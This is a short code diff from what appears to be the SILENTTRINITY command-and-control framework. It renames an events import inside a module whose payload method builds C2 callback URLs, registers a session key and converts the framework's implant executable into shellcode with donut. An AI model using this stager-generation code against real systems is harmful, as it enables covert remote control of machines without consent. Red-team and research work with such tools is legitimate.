@@ -1,6 +1,6 @@
 import donut
 import uuid
-import silenttrinity.core.events as events
+from silenttrinity.core.events import Events
 from silenttrinity.core.teamserver import ipc_server
 from silenttrinity.core.teamserver.crypto import gen_stager_psk
 from silenttrinity.core.utils import shellcode_to_hex_byte_array, print_bad, get_path_in_package
@@ -44,7 +44,7 @@ class STModule(Module):
             #}
 
     def payload(self):
-        listener = ipc_server.publish_event(events.GET_LISTENERS, (self.options['Listener']['Value'],))
+        listener = ipc_server.publish_event(Events.GET_LISTENERS, (self.options['Listener']['Value'],))
         if listener:
             c2_urls = ','.join(
                 filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
@@ -52,7 +52,7 @@ class STModule(Module):
 
             guid = uuid.uuid4()
             psk = gen_stager_psk()
-            ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))
+            ipc_server.publish_event(Events.SESSION_REGISTER, (guid, psk))
 
             donut_shellcode = donut.create(file=get_path_in_package('core/teamserver/data/naga.exe'), params=f"{guid};{psk};{c2_urls}", arch=2 if self.options['Architecture']['Value'] == 'x64' else 1)
             shellcode = shellcode_to_hex_byte_array(donut_shellcode)
